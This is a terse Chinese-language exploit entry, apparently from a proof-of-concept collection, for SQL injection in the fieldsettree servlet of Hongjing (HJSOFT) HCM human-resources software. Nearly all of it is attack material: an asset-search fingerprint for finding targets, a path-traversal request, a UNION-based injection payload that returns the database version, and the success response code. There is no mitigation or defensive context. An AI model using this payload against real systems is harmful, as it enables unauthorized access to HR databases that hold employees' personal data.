# 宏景fieldsettree接口存在SQL注入漏洞.

宏景fieldsettree接口 ｜ SQL注入 ｜ —
- **指纹**：`app="HJSOFT-HCM"`
- **请求**：`POST /templates/attestation/../../servlet/fieldsettree HTTP/1.1`

**Payload**
```
flag=2&infor=1' UNION ALL SELECT 18,@@version,18-- ltAi
```
- **响应特征**：200